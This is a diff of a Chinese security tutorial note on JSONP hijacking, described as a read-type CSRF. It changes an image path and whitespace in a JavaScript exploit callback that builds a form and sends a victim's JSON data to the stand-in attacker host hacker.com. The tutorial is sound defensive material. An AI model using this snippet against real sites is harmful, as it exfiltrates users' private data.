@@ -25,7 +25,7 @@ JSONP劫持，实质上算是一种读类型的CSRF，在恶意的网页中构�
 
 没错JSONP劫持类似于[[前端安全：CSRF|CSRF]]漏洞，步骤大概如下图所示：
 
-![[1666134937.png]]
+![[_attachment/img/1666134937.png]]
 
 利用代码如下所示：
 
@@ -38,15 +38,15 @@ JSONP劫持，实质上算是一种读类型的CSRF，在恶意的网页中构�
 function hehehe(obj){
     var myForm = document.createElement("form");
     myForm.action="http://hacker.com/redirect.php";
-    myForm.method = "GET";  
-    for ( var k in obj) {  
-        var myInput = document.createElement("input");  
-        myInput.setAttribute("name", k);  
-        myInput.setAttribute("value", obj[k]);  
-        myForm.appendChild(myInput);  
-    }  
-    document.body.appendChild(myForm);  
-    myForm.submit();  
+    myForm.method = "GET";
+    for ( var k in obj) {
+        var myInput = document.createElement("input");
+        myInput.setAttribute("name", k);
+        myInput.setAttribute("value", obj[k]);
+        myForm.appendChild(myInput);
+    }
+    document.body.appendChild(myForm);
+    myForm.submit();
     document.body.removeChild(myForm);
 }
 </script>
